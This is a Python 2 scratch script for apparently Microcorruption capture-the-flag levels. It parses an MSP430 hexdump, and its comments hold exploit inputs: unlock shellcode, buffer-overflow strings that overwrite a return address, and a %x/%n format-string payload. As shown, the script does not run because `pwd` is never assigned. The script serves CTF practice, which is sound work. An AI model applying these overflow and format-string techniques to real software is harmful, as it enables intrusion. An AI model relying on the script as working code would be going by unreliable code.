


CODE = """
4400:   3140 783a 1542 5c01 75f3 35d0 085a 3f40   1@x:.B\.u.5..Z?@
4410:   0000 0f93 0724 8245 5c01 2f83 9f4f c445   .....$.E\./..O.E
4420:   0024 f923 3f40 0000 0f93 0624 8245 5c01   .$.#?@.....$.E\.
4430:   1f83 cf43 0024 fa23 b012 f444 32d0 f000   ...C.$.#...D2...
4440:   fd3f 3040 c245 0412 0441 2453 2183 c443   .?0@.E...A$S!..C
4450:   fcff 3e40 fcff 0e54 0e12 0f12 3012 7e00   ..>@...T....0.~."""

STACKADDR = 0x3a66


def parsecode( code ):
    lines = code.strip().split('\n')

    startaddr = int(lines[0][:4], 16)

    raw = ''
    for line in lines:
        lraw = line[8:49].replace(' ','')
        raw += lraw

    return (raw, startaddr)




#
#445c:  3012 7e00      push	#0x7e
#4460:  b012 3245      call	#0x4532 <INT>
#
#  30127f00b0123245663a663a663a663a663a663a663a663a663a663a663a
#  30127f01b0124c456666666666666666ee43
#  MONTEVIDEO:   3f407f018f101f838f100f12b0124c45ee43

# 12345678abcdefghHHFD

# santa cruz
# twasbrilligandtheslithytovesdidgyreandgimpJD
# 747761736272696c6c6967616e64746865082069746879746f76657364696467797265616e6467696d704a44
# passwordpasswords


# jakarta
# rdpasswordpassword
# passwordpassLD


def hexify(s):
    return ''.join([('%02x' % ord(c)) for c in s])

def main():
    #santa cruz
    # pwd = hexify('twasbrilligandthe\x08\x20ithytovesdidgyreandgimpJD')

    # novosibirsk: 2578c8442578c8442578c8442578c8442578c8442578c8442578c8442578c8442578c8442578c8442578c8442578c8442578c8442578c8442578c8442578c8442578c8442578c8442578c8442578c8444142434445462525256e2578c8442578c8442578c844
    #rep = 0x14
    #pwd = '2578c844' * rep
    #pwd += '414243444546'
    #pwd += '2525'
    #pwd += '256e'
    #pwd += '2578c844' * 3

    print '}}' + pwd + '{{'
    #print '>>' + hexify(pwd) + '<<'



main()



